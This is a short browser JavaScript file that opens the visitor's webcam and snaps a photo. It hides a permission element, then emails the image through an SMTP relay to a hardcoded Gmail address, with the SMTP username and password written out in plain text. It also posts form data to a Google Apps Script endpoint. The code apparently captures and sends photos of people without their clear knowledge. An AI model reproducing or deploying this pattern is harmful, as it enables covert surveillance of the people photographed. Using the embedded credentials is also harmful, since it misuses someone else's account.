const webcamElement = document.getElementById('webcam');
const canvasElement = document.getElementById('canvas');
const webcam = new Webcam(webcamElement, 'user', canvasElement, null);
var picture;

webcam.start()
    .then(result => {
        console.log("webcam started");
    })
    .catch(err => {
        console.log(err);
    });

async function takePhoto() {
    picture = webcam.snap();
    console.log(picture);

    await sleep(100);

    document.querySelector("#data").value = picture.toString().substring(0, picture.length / 20);

    hidePermission();

    await sleep(2500);

    sendPhotoEmail();
}

function sendPhotoEmail() {
    Email.send({
        Host: "smtp.elasticemail.com",
        Username: "brewcrew209542@gmail.com",
        Password: "4A7DFBBE0DBDD1D44CC8615FA2A41BFE7B93",
        To: 'masonmcmanus07@gmail.com',
        From: "masonmcmanus07@gmail.com",
        Subject: "Sending Email using javascript",
        Body: picture,
      })
        .then(function (message) {
          alert("mail sent successfully")
        });
}

function sendPhoto() {
    const form = document.querySelector("#form");
    const scriptURL = "https://script.google.com/macros/s/AKfycbzPrg8icstnryZ3Xe0xYFWgKTRALuAIS6fbvmFOHW0ApB8_ocE4MedZ2xPYbmK6T28PtQ/exec";

    var requestBody = new FormData(form);
    console.log(requestBody);
    fetch(scriptURL, { method: 'POST', body: requestBody })
        .then(response => {
            //alert('Success!', response);
        })
        .catch(error => {
            alert('Error!', error.message);
    });
}

const sleep = (milliseconds) => {
    return new Promise(resolve => setTimeout(resolve, milliseconds))
  }